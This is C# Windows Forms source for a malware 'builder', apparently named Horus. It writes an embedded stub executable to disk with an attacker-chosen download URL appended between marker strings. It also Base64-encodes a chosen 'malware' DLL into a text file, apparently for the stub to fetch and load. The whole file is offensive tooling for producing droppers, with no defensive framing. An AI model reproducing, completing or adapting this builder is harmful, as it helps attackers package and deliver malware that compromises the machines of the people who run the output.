using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;

namespace Builder
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
        }

        private void Btn_build_Click(object sender, EventArgs e)
        {      
            var MyStubByte = Properties.Resources.HStub;
            File.WriteAllBytes(Environment.CurrentDirectory + "/" + txt_sname.Text, MyStubByte);
            FileStream fs = new FileStream(Environment.CurrentDirectory + "/" + txt_sname.Text, FileMode.Append); 
            BinaryWriter bw = new BinaryWriter(fs);
            string url=txt_url.Text;
            bw.Write("#URL#" + url + "#ENDURL#");
            bw.Flush();
            bw.Close();
            fs.Close();
            MessageBox.Show("It was successfully created.");
        }

        private void Btn_slct_malware_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog
            {
                Filter = "Dll File |*.dll",
                RestoreDirectory = true,
                CheckFileExists = false,
                Title = "File choose.."
            };

            if (file.ShowDialog() == DialogResult.OK)
            {
                 str_malware.Text = file.FileName;
            }
        }

        private void Btn_slct_save_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog
            {
                Filter = "Txt File|*.txt",
                OverwritePrompt = true
            };

            if (sfd.ShowDialog() == DialogResult.OK)
            {
                str_save_txt.Text = sfd.FileName;
            }
        }
        private static void FileToBase64(string inputFile, string outputFile) // Belirtilen kaynak dosyayı base64'e çevirir.
        {
 
            byte[] bytes = File.ReadAllBytes(inputFile);
            string file = Convert.ToBase64String(bytes);
            File.WriteAllText(outputFile, file);

        }

        private void Btn_convert_Click(object sender, EventArgs e)
        {
            FileToBase64(str_malware.Text, str_save_txt.Text); //düzelcek
            MessageBox.Show("It was successfully created.");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            lbl_horus.ForeColor = Color.FromArgb(19, 76, 36, 29);
            lbl_horus_info.ForeColor = Color.FromArgb(19, 76, 36, 29);
        }
    }
}
